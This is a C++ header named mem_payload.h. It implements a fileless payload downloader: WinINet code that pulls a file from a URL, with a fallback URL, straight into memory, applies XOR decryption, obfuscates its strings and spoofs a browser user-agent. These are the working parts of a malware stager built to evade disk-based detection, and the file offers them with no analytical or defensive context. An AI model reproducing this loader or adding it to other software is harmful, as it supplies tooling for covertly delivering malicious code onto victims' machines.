#pragma once
/*
 * mem_payload.h - Download files directly to memory (no disk),
 * with optional XOR encryption/decryption.
 */
#include <windows.h>
#include <wininet.h>
#include <vector>
#include <string>
#include "string_crypt.h"
#pragma comment(lib, "wininet.lib")

namespace MemPayload {

// Simple XOR encrypt/decrypt (symmetric). Use same key to encrypt files
// before uploading and to decrypt after downloading.
inline void XorCrypt(std::vector<uint8_t>& data, const uint8_t* key, size_t keyLen) {
    for (size_t i = 0; i < data.size(); i++)
        data[i] ^= key[i % keyLen];
}

// Download a URL directly into a memory buffer (zero disk writes).
inline bool DownloadToMemory(const std::string& url, std::vector<uint8_t>& outBuffer) {
    outBuffer.clear();

    std::string ua = E("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    HINTERNET hInet = InternetOpenA(ua.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInet) return false;

    HINTERNET hUrl = InternetOpenUrlA(hInet, url.c_str(), nullptr, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInet);
        return false;
    }

    uint8_t buf[8192];
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
        outBuffer.insert(outBuffer.end(), buf, buf + bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);

    return outBuffer.size() > 1024; // Minimum sanity check
}

// Download with fallback URL
inline bool DownloadToMemoryWithFallback(const std::string& primaryUrl,
                                          const std::string& fallbackUrl,
                                          std::vector<uint8_t>& outBuffer) {
    if (DownloadToMemory(primaryUrl, outBuffer))
        return true;
    return DownloadToMemory(fallbackUrl, outBuffer);
}

} // namespace MemPayload
